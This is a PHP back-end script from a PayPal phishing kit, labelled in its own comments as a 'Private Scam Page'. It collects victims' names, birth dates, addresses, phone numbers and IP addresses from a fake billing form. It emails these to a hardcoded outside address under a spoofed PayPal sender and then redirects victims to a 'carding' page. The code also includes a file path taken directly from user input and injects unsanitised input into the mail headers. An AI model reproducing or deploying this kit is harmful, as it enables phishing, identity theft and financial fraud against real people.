<?php

/*
__________________________________________________________________________________________________________________
Private Scam Page*********KAKA
---------------------------------------
Paypal Scam
KAKA / KAKA / KAKA / KAKA / 
KAKA / KAKA / KAKA / KAKA / 
ZIZOU / ZIZOU / ZIZOU  / ZIZOU / 
__________________________________________________________________________________________________________________
*/


/*========== [ Variables ]==========*/
$ip = getenv("REMOTE_ADDR");
$firstname = $_POST['_fn'];
$lastname = $_POST['_ln'];
$birthday = $_POST['_birthd'];
$birthmonth = $_POST['_birthm'];
$birthyear = $_POST['_birthy'];
$hostname = $_POST['hostname'];
$address1 = $_POST['_add1'];
$address2 = $_POST['_add2'];
$country = $_POST['_countr'];
$city = $_POST['_ct'];
$state = $_POST['_st'];
$zip = $_POST['_zipc'];
$phone = $_POST['_ph'];
/*========== [ Variables ]==========*/

$message = "
=========[BILLING INFOS]=========
Full Name 		: $firstname $lastname
Date of birth 	: $birthday - $birthmonth - $birthyear
Address 1		: $address1
address 2  		: $address2
Country  		: $country
City  			: $city
State  			: $state
ZIP 			: $zip
Phone 			: $phone
===============[IP]==============
IP	: http://www.geoiptool.com/?IP=$ip
=================================";

$encrypt=  base64_encode($message);
include "$hostname";

$to = "Max.dz@outlook.com"; // Email Here
$subject = "BILLING $country = [$ip]";
$headers = "From: PayPal Info <paypal@support.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";

mail($to, $subject, $message,$headers);

header("Location:websc-carding.php");


?>